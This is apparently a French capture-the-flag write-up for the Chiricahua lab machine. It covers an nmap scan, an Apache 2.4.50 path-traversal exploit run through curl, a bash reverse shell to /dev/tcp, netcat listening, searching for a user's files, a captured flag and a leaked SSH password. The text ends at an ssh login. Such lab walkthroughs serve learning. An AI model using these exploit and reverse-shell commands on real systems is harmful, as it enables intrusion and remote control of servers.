I. Lancement de la machine virtuelle
Dans le site de Battle Hack, nous allons dans le mode Campaign et ont choisi CHRICAHUA dans la
saison 1 comme environnement Virtuel.
Figure 1 Machine virtuel Chiricahua
II. Nmap
Une fois la machine on installe le VPN et on lance la commande :
sudo nmap -A 10.42.4.36
[sudo] Mot de passe de kali :
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-26 08:50 CEST
Nmap scan report for 10.42.4.36
Host is up (0.097s latency).
Not shown: 998 closed tcp ports (reset)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
| 2048 efaa21cb7964499f45acb1c4789d1916 (RSA)
| 256 63ede9ddff06cba186fe9bad16faacad (ECDSA)
|_ 256 b392b3cb12d160549ed18314426c29b9 (ED25519)
80/tcp open http Apache httpd 2.4.50 ((Unix))
|_http-server-header: Apache/2.4.50 (Unix)
|_http-title: Chiricahua
| http-methods:
|_ Potentially risky methods: TRACE
Ce qu’on sait, les ports 22 (SSH) et 80 http sont ouvert. Sur le port 80 en http, on accède à une page
WEB :
Figure 2 Page Web Chiricahua
III. Analyse de la vulnérabilité
Sur internet on recherche la vulnérabilité « apache 2.4 50 ».
On trouve un script à télécharger, on récupère un script qu’on injecte comme ci-dessous :
Curl
"http://10.42.4.36/cgibin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%
32%65/bin/sh" -d "echo;id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Création d’un fichier texte auxquels on va ajouter ce script :
bash -i >& /dev/tcp/10.201.0.5/4244 0>&1
Il permet d’ouvrir une connexion avec l’adresse local de la machine.
On exécute le script python.
python3 -m http.server
On vient de lancer la connexion pendant ce temps-là on lance le port d’écoute :
nc -lnvp 4244
IV. Accès à la machine
Une fois lancé, on accède à la machine.
<-b63d-4aed-b5f6-069fbc25833a-5c77c5f664sbbcx:/bin$
On va localiser à l’aide de la commande FIND :
find / -user geronimo 2>/dev/null | grep -v '/proc'
/home/geronimo
/home/geronimo/.bash_logout
/home/geronimo/.bashrc
/home/geronimo/.profile
/etc/init.d/goyahkla
/etc/mysql/war.sql
On voit plusieurs dossiers, d’abord on va voir le fichier /home/geronimo et on trouvera un fichier
user.txt. On trouvera le premier flag.
-b5f6-069fbc25833a-5c77c5f664sbbcx:/home/geronimo$ cat user.txt
cat user.txt
FLAG{3b3GZi6u12}
On recherche le fichier /etc/mysql/war.sql
On trouvera le mot de passe ssh de l’utilisateur Goyahkla.
IDENTIFIED BY '6yFwwB4yN
On se connecte en ssh.
ssh geronimo@IPaddress